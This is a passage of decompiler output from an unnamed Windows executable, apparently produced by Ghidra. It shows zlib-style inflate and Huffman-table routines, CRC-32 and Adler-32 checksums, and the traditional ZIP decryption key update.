            for (; uVar12 < local_10; uVar12 = uVar12 + 8) {
              if (local_20 == (byte *)0x0) goto LAB_00405868;
              bVar10 = *_Src;
              local_20 = local_20 + -1;
              _Src = _Src + 1;
              param_1 = 0;
              uVar6 = uVar6 | (uint)bVar10 << ((byte)uVar12 & 0x1f);
              local_28 = uVar6;
            }
            uVar6 = uVar6 >> (bVar2 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_00427370 + local_14 * 4) & uVar6);
            local_28 = uVar6 >> ((byte)local_14 & 0x1f);
            uVar12 = uVar12 - (local_14 + uVar11);
            iVar9 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar9) {
LAB_0040598b:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)"invalid bit length repeat";
              *(uint *)((int)this + 0x20) = local_28;
              *(uint *)((int)this + 0x1c) = uVar12;
              in_EAX[1] = local_20;
              in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
              *in_EAX = _Src;
              *(byte **)((int)this + 0x34) = pbVar3;
              FUN_00404830(-3);
              return;
            }
            if (local_c == 0x10) {
              if (iVar9 == 0) goto LAB_0040598b;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar9 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar9 * 4) = uVar7;
              iVar9 = iVar9 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar9;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_14 = 9;
      local_18 = (byte *)0x6;
      iVar9 = FUN_004060b0((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                           (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,*(void **)((int)this + 0xc),
                           &local_14,(int *)&local_18,&local_8,&local_4,*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        param_1 = iVar9;
        goto LAB_00405140;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1a);
      if (puVar8 == (undefined4 *)0x0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404830(-4);
        return;
      }
      *(undefined *)(puVar8 + 4) = (undefined)local_14;
      *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
      *puVar8 = 0;
      *(int *)((int)puVar8 + 0x12) = local_8;
      *(int *)((int)puVar8 + 0x16) = local_4;
      *(undefined4 **)((int)this + 4) = puVar8;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_00405164_caseD_405764:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      pbVar4 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar4);
      *(byte **)((int)this + 0x34) = pbVar3;
      iVar9 = FUN_00404960(this,param_1);
      if (iVar9 != 1) {
        FUN_00404830(iVar9);
        return;
      }
      param_1 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      uVar5 = *(uint *)((int)this + 0x20);
      local_24 = *(byte **)((int)this + 0x34);
      local_20 = in_EAX[1];
      _Src = *in_EAX;
      uVar12 = *(uint *)((int)this + 0x1c);
      if (local_24 < *(byte **)((int)this + 0x30)) {
        local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_24);
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
      }
      local_28 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
switchD_00405164_caseD_405a5a:
        *(byte **)((int)this + 0x34) = local_24;
        param_1 = FUN_00404830(param_1);
        local_24 = *(byte **)((int)this + 0x34);
        if (*(byte **)((int)this + 0x30) == local_24) {
          *(undefined4 *)this = 8;
switchD_00405164_caseD_405a97:
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
          *in_EAX = _Src;
          *(byte **)((int)this + 0x34) = local_24;
          FUN_00404830(1);
          return;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        goto LAB_00405140;
      }
      *(undefined4 *)this = 0;
      break;
    case (undefined *)0x405514:
      goto switchD_00405164_caseD_405514;
    case (undefined *)0x405764:
      goto switchD_00405164_caseD_405764;
    case (undefined *)0x405890:
switchD_00405164_caseD_405890:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
      *in_EAX = _Src;
      *(byte **)((int)this + 0x34) = pbVar3;
      FUN_00404830(-3);
      return;
    case (undefined *)0x405a5a:
      goto switchD_00405164_caseD_405a5a;
    case (undefined *)0x405a97:
      goto switchD_00405164_caseD_405a97;
    }
                    // WARNING: Load size is inaccurate
    uVar11 = *this;
    pbVar3 = local_24;
    uVar6 = uVar5;
    uVar5 = local_28;
  } while( true );
LAB_00405868:
  *(uint *)((int)this + 0x20) = local_28;
  *(uint *)((int)this + 0x1c) = uVar12;
  in_EAX[1] = (byte *)0x0;
  goto LAB_00405140;
}



undefined4 FUN_00405b10(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



undefined4 __thiscall
FUN_00405ba0(void *this,uint param_1,uint param_2,int param_3,int param_4,int *param_5,int param_6,
            uint *param_7,uint *param_8)

{
  uint uVar1;
  undefined3 uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *in_EAX;
  int *piVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  undefined4 *puVar13;
  char cVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  byte bVar19;
  int iVar20;
  uint local_fc;
  uint *local_f8;
  uint local_f4;
  uint local_f0;
  uint *local_ec;
  uint local_e4;
  undefined4 local_dc;
  uint local_d8;
  int local_d4;
  int local_d0;
  int local_c8;
  uint local_c0 [16];
  uint local_80 [16];
  int aiStack_40 [16];
  
  local_c0[0] = 0;
  local_c0[1] = 0;
  local_c0[2] = 0;
  local_c0[3] = 0;
  local_c0[4] = 0;
  local_c0[5] = 0;
  local_c0[6] = 0;
  local_c0[7] = 0;
  local_c0[8] = 0;
  local_c0[9] = 0;
  local_c0[10] = 0;
  local_c0[11] = 0;
  local_c0[12] = 0;
  local_c0[13] = 0;
  local_c0[14] = 0;
  local_c0[15] = 0;
  piVar5 = (int *)this;
  uVar15 = param_1;
  do {
    local_c0[*piVar5] = local_c0[*piVar5] + 1;
    piVar5 = piVar5 + 1;
    uVar15 = uVar15 - 1;
  } while (uVar15 != 0);
  if (local_c0[0] == param_1) {
    *param_5 = 0;
    *in_EAX = 0;
  }
  else {
    local_f0 = 1;
    do {
      if (local_c0[local_f0] != 0) break;
      local_f0 = local_f0 + 1;
    } while (local_f0 < 0x10);
    local_fc = *in_EAX;
    if (*in_EAX < local_f0) {
      local_fc = local_f0;
    }
    uVar15 = 0xf;
    do {
      if (local_c0[uVar15] != 0) break;
      uVar15 = uVar15 - 1;
    } while (uVar15 != 0);
    if (uVar15 < local_fc) {
      local_fc = uVar15;
    }
    *in_EAX = local_fc;
    iVar20 = 1 << ((byte)local_f0 & 0x1f);
    for (uVar9 = local_f0; uVar9 < uVar15; uVar9 = uVar9 + 1) {
      if ((int)(iVar20 - local_c0[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar20 = (iVar20 - local_c0[uVar9]) * 2;
    }
    iVar20 = iVar20 - local_c0[uVar15];
    if (iVar20 < 0) {
      return 0xfffffffd;
    }
    local_c0[uVar15] = local_c0[uVar15] + iVar20;
    iVar10 = 0;
    iVar16 = uVar15 - 1;
    local_80[1] = 0;
    if (iVar16 != 0) {
      iVar18 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_c0 + iVar18 + 4);
        iVar16 = iVar16 + -1;
        *(int *)((int)local_80 + iVar18 + 8) = iVar10;
        iVar18 = iVar18 + 4;
      } while (iVar16 != 0);
    }
    uVar9 = 0;
    do {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      this = (void *)((int)this + 4);
      if (iVar10 != 0) {
        uVar8 = local_80[iVar10];
        param_8[uVar8] = uVar9;
        local_80[iVar10] = uVar8 + 1;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_1);
    uVar9 = local_80[uVar15];
    iVar16 = -1;
    iVar10 = -local_fc;
    local_e4 = 0;
    local_80[0] = 0;
    local_ec = param_8;
    aiStack_40[1] = 0;
    local_c8 = 0;
    local_f4 = 0;
    if ((int)local_f0 <= (int)uVar15) {
      local_d0 = local_f0 - 1;
      local_f8 = local_c0 + local_f0;
      do {
        uVar8 = *local_f8;
        uVar3 = local_dc;
        while (local_dc = uVar3, uVar8 != 0) {
          local_dc._2_2_ = (undefined2)((uint)uVar3 >> 0x10);
          uVar1 = uVar8 - 1;
          local_d4 = iVar10 + local_fc;
          if (local_d4 < (int)local_f0) {
            iVar11 = iVar10 - local_fc;
            iVar18 = iVar16;
            do {
              local_d4 = local_d4 + local_fc;
              iVar10 = iVar10 + local_fc;
              iVar16 = iVar18 + 1;
              iVar11 = iVar11 + local_fc;
              uVar17 = uVar15 - iVar10;
              if (local_fc < uVar15 - iVar10) {
                uVar17 = local_fc;
              }
              uVar12 = local_f0 - iVar10;
              uVar6 = 1 << ((byte)uVar12 & 0x1f);
              if ((uVar8 < uVar6) &&
                 (iVar7 = uVar6 + (-1 - uVar1), puVar4 = local_f8, uVar12 < uVar17)) {
                while (uVar12 = uVar12 + 1, uVar12 < uVar17) {
                  if ((uint)(iVar7 * 2) <= puVar4[1]) break;
                  iVar7 = iVar7 * 2 - puVar4[1];
                  puVar4 = puVar4 + 1;
                }
              }
              local_f4 = 1 << ((byte)uVar12 & 0x1f);
              uVar17 = local_f4 + *param_7;
              if (0x5a0 < uVar17) {
                return 0xfffffffd;
              }
              local_c8 = param_6 + *param_7 * 8;
              aiStack_40[iVar18 + 2] = local_c8;
              *param_7 = uVar17;
              if (iVar16 == 0) {
                *param_5 = local_c8;
              }
              else {
                local_80[iVar16] = local_e4;
                uVar17 = local_e4 >> ((byte)iVar11 & 0x1f);
                iVar18 = aiStack_40[iVar16];
                local_d8 = (local_c8 - iVar18 >> 3) - uVar17;
                *(undefined4 *)(iVar18 + uVar17 * 8) = local_dc;
                *(uint *)(iVar18 + 4 + uVar17 * 8) = local_d8;
              }
              iVar18 = iVar16;
            } while (local_d4 < (int)local_f0);
          }
          bVar19 = (byte)iVar10;
          uVar2 = CONCAT21(local_dc._2_2_,(char)local_f0 - bVar19);
          if (local_ec < param_8 + uVar9) {
            local_d8 = *local_ec;
            if (local_d8 < param_2) {
              cVar14 = (-(local_d8 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar18 = (local_d8 - param_2) * 4;
              local_d8 = *(uint *)(iVar18 + param_3);
              cVar14 = *(char *)(iVar18 + param_4) + 'P';
            }
            local_ec = local_ec + 1;
            local_dc = CONCAT31(uVar2,cVar14);
          }
          else {
            local_dc = CONCAT31(uVar2,0xc0);
          }
          iVar18 = 1 << ((char)local_f0 - bVar19 & 0x1f);
          uVar8 = local_e4 >> (bVar19 & 0x1f);
          if (uVar8 < local_f4) {
            puVar13 = (undefined4 *)(local_c8 + uVar8 * 8);
            do {
              *puVar13 = local_dc;
              puVar13[1] = local_d8;
              uVar8 = uVar8 + iVar18;
              puVar13 = puVar13 + iVar18 * 2;
            } while (uVar8 < local_f4);
          }
          uVar17 = 1 << ((byte)local_d0 & 0x1f);
          uVar8 = local_e4 & uVar17;
          while (uVar8 != 0) {
            local_e4 = local_e4 ^ uVar17;
            uVar17 = uVar17 >> 1;
            uVar8 = local_e4 & uVar17;
          }
          local_e4 = local_e4 ^ uVar17;
          uVar8 = uVar1;
          uVar3 = local_dc;
          if (((1 << (bVar19 & 0x1f)) - 1U & local_e4) != local_80[iVar16]) {
            do {
              iVar10 = iVar10 - local_fc;
              iVar16 = iVar16 + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & local_e4) != local_80[iVar16]);
          }
        }
        local_f8 = local_f8 + 1;
        local_d0 = local_d0 + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_f0 <= (int)uVar15);
    }
    if ((iVar20 != 0) && (uVar15 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_00406010(void *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00405ba0(param_1,0x13,0x13,0,0,param_3,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = "oversubscribed dynamic bit lengths tree";
  }
  else if ((iVar2 == -5) || (*param_2 == 0)) {
    *(char **)(unaff_EBX + 0x18) = "incomplete dynamic bit lengths tree";
    iVar2 = -3;
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_004060b0(uint param_1,uint param_2,void *param_3,int *param_4,int *param_5,int *param_6,
            int *param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00405ba0(param_3,param_1,0x101,0x428538,0x4285b8,param_6,param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_00405ba0((void *)((int)param_3 + param_1 * 4),param_2,0,0x428638,0x4286b0,param_7,
                           param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = "oversubscribed distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = "incomplete distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_004061e4;
      }
      *(char **)(unaff_EBX + 0x18) = "empty distance tree with lengths";
      iVar2 = -3;
LAB_004061e4:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = "oversubscribed literal/length tree";
      goto LAB_00406219;
    }
    if (iVar2 == -4) goto LAB_00406219;
  }
  *(char **)(unaff_EBX + 0x18) = "incomplete literal/length tree";
  iVar2 = -3;
LAB_00406219:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_00406230(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  uint uVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar15 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar9 = *(uint *)(&DAT_00427370 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_00427370 + param_2 * 4);
  local_c = pbVar11;
  do {
    for (; uVar4 < 0x14; uVar4 = uVar4 + 8) {
      bVar1 = *pbVar11;
      local_14 = local_14 + -1;
      pbVar11 = pbVar11 + 1;
      uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
      local_c = pbVar11;
    }
    bVar1 = *(byte *)(param_3 + (uVar9 & uVar15) * 8);
    uVar10 = (uint)bVar1;
    iVar7 = param_3 + (uVar9 & uVar15) * 8;
    uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
    if (uVar10 == 0) {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      *puVar16 = *(undefined *)(iVar7 + 4);
LAB_0040647f:
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      while ((bVar1 & 0x10) == 0) {
        if ((uVar10 & 0x40) != 0) {
          if ((uVar10 & 0x20) != 0) {
            uVar9 = (int)param_6[1] - (int)local_14;
            if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
              uVar9 = uVar4 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
            param_6[1] = local_14 + uVar9;
            pbVar3 = *param_6;
            *param_6 = pbVar11 + -uVar9;
            param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)"invalid literal/length code";
          goto LAB_0040654d;
        }
        iVar5 = (*(uint *)(&DAT_00427370 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
        bVar1 = *(byte *)(iVar7 + iVar5 * 8);
        uVar10 = (uint)bVar1;
        iVar7 = iVar7 + iVar5 * 8;
        uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
        if (uVar10 == 0) {
          uVar4 = uVar4 - *(byte *)(iVar7 + 1);
          *puVar16 = *(undefined *)(iVar7 + 4);
          goto LAB_0040647f;
        }
        uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      }
      uVar10 = uVar10 & 0xf;
      uVar6 = (*(uint *)(&DAT_00427370 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
      uVar15 = uVar15 >> (sbyte)uVar10;
      for (uVar4 = uVar4 - uVar10; uVar4 < 0xf; uVar4 = uVar4 + 8) {
        bVar1 = *pbVar11;
        local_14 = local_14 + -1;
        pbVar11 = pbVar11 + 1;
        uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
        local_c = pbVar11;
      }
      pbVar3 = (byte *)(param_4 + (uVar2 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
      uVar4 = uVar4 - pbVar3[1];
      bVar1 = *pbVar3;
      while ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          param_6[6] = (byte *)"invalid distance code";
LAB_0040654d:
          uVar9 = uVar4 >> 3;
          if ((uint)((int)param_6[1] - (int)local_14) <= uVar4 >> 3) {
            uVar9 = (int)param_6[1] - (int)local_14;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
          param_6[1] = local_14 + uVar9;
          pbVar3 = *param_6;
          *param_6 = pbVar11 + -uVar9;
          param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar7 = (*(uint *)(&DAT_00427370 + (uint)bVar1 * 4) & uVar15) + *(int *)(pbVar3 + 4);
        pbVar12 = pbVar3 + iVar7 * 8;
        pbVar3 = pbVar3 + iVar7 * 8;
        uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
        uVar4 = uVar4 - pbVar3[1];
        bVar1 = *pbVar12;
      }
      uVar10 = bVar1 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
      for (; uVar4 < uVar10; uVar4 = uVar4 + 8) {
        local_14 = local_14 + -1;
        uVar15 = uVar15 | (uint)*pbVar12 << ((byte)uVar4 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_00427370 + uVar10 * 4) & uVar15;
      uVar15 = uVar15 >> (sbyte)uVar10;
      puVar8 = puVar16 + -(uVar13 + *(int *)(pbVar3 + 4));
      puVar14 = *(undefined **)(param_5 + 0x28);
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar6;
      local_c = pbVar11;
      if (puVar8 < puVar14) {
        do {
          puVar8 = puVar8 + (*(int *)(param_5 + 0x2c) - (int)puVar14);
        } while (puVar8 < puVar14);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar8;
        if (uVar10 < uVar6) {
          iVar7 = uVar6 - uVar10;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar14 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
        else {
          *puVar16 = *puVar8;
          puVar16[1] = puVar8[1];
          puVar16 = puVar16 + 2;
          puVar8 = puVar8 + 2;
          iVar7 = uVar6 - 2;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
      }
      else {
        *puVar16 = *puVar8;
        puVar16[1] = puVar8[1];
        puVar16 = puVar16 + 2;
        puVar8 = puVar8 + 2;
        iVar7 = uVar6 - 2;
        do {
          *puVar16 = *puVar8;
          puVar16 = puVar16 + 1;
          puVar8 = puVar8 + 1;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
      uVar9 = (int)param_6[1] - (int)local_14;
      if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
        uVar9 = uVar4 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
      param_6[1] = local_14 + uVar9;
      pbVar3 = *param_6;
      *param_6 = pbVar11 + -uVar9;
      param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_004065a0(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 != (byte *)0x0) {
    uVar1 = ~in_EAX;
    if (7 < param_2) {
      uVar2 = param_2 >> 3;
      do {
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((*param_1 ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[1] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[2] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[3] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[4] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[5] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[6] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((param_1[7] ^ uVar1) & 0xff) * 4);
        param_1 = param_1 + 8;
        param_2 = param_2 - 8;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    for (; param_2 != 0; param_2 = param_2 - 1) {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((*param_1 ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 1;
    }
    return ~uVar1;
  }
  return 0;
}



void __fastcall FUN_004066b0(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_00428728 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_00428728 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00406700(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_00428728 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_00428728 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_00406770(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
